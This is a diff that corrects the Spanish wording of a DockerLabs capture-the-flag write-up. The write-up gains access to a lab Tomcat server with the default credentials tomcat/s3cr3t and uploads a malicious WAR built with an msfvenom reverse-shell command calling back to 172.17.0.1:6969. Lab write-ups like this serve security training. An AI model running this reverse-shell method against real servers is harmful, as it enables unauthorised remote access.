@@ -25,35 +25,35 @@ Empezamos con un escaneo de los puertos.
 
 ![Pn](https://github.com/giustiand/DockerLabs-Writeups/blob/main/F%C3%A1cil/images/pn/Pn_1.jpg)   
 
-Tenemos solamente un puerto abierto, el 8080, donde podemos ver que corre un Tomcat.  
+Solo tenemos un puerto abierto, el 8080, donde podemos ver que está corriendo un Tomcat.  
 
 ![Pn](https://github.com/giustiand/DockerLabs-Writeups/blob/main/F%C3%A1cil/images/pn/Pn_2.jpg)     
 
-Podemos intentar a acceder con las credenciales por defecto.  
-Miramos en Google cuales suelen ser y probamos si unas de ellas funciona.  
+Podemos intentar acceder con las credenciales por defecto.    
+Buscamos en Google cuáles suelen ser y probamos si alguna de ellas funciona.  
 
 ![Pn](https://github.com/giustiand/DockerLabs-Writeups/blob/main/F%C3%A1cil/images/pn/Pn_3.jpg)    
 
-Vemos que hay una combinación que sí que funciona!  
-Si intentamos acceder a través de Manager App y porporcionamos como usuario **tomcat** y como contraseña **s3cr3t** ya podemos acceder.    
+¡Vemos que hay una combinación que sí funciona!    
+Si intentamos acceder a través de Manager App y proporcionamos como usuario **tomcat** y como contraseña **s3cr3t**, ya podemos acceder.    
 
-Ahora lo que haremos será crear un fichero .war maliciososo con la herramienta **msfvenom**.  
-Utilizaremos el comando:  
+Ahora lo que haremos será crear un archivo .war malicioso con la herramienta **msfvenom**.    
+Utilizaremos el comando:   
 
 `sudo msfvenom -p java/jsp_shell_reverse_tcp LHOST=172.17.0.1 LPORT=6969 -f war -o rev.war`  
 
 ![Pn](https://github.com/giustiand/DockerLabs-Writeups/blob/main/F%C3%A1cil/images/pn/Pn_4.jpg)     
 
-Una vez creado lo subiremos a través del menu **WAR file to deploy**.  
+Una vez creado, lo subiremos a través del menú **WAR file to deploy**.  
 
 ![Pn](https://github.com/giustiand/DockerLabs-Writeups/blob/main/F%C3%A1cil/images/pn/Pn_5.jpg)   
 
-Por último nos pondremos a la escucha en la nuestra maquina atacante y abriremos el fichero que hemos cargado.  
+Por último, nos pondremos a la escucha en nuestra máquina atacante y abriremos el archivo que hemos cargado.  
 
 ![Pn](https://github.com/giustiand/DockerLabs-Writeups/blob/main/F%C3%A1cil/images/pn/Pn_6.jpg)   
 
-Y listo!  
-Ya somos root!  
+¡Y listo!   
+¡Ya somos root!  
 
 ![Pn](https://github.com/giustiand/DockerLabs-Writeups/blob/main/F%C3%A1cil/images/pn/Pn_7.jpg) 
 
